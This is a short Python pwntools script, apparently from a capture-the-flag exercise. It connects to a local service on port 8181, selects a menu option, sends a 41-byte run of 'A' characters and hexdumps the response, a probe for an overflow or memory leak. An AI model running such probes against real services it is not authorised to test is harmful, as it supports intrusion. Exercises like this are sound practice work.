from pwn import *
import time

r = remote("localhost", 8181)
print r.recvuntil('menu >')
r.send('1\n')

print r.recvuntil(":")
print r.recv(1024)
r.send("A"*41)
print hexdump(r.recv(1024))
